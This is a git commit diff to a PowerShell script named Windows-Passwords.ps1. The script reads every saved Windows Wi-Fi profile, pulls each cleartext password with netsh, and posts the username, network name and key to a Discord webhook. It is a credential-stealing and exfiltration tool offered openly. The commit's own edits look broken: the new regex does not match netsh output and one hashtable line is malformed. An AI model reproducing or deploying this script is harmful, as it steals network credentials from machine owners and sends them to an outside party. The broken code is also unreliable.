f09f59bfed65d5867553645eb7b30b980ad2ec42
KingCorgi101 <leogmasters@gmail.com>
2025-04-16 20:33:48 -0400

    Update Windows-Passwords.ps1

--- Windows-Passwords.ps1
+++ Windows-Passwords.ps1
@@ -2,11 +2,11 @@
 # ENG
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
-    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Wifi Pass:\s+:\s).+'
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
-		'content' = [string]$passw
+		'content' = [string]$wlan [string]$passw
 	}
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
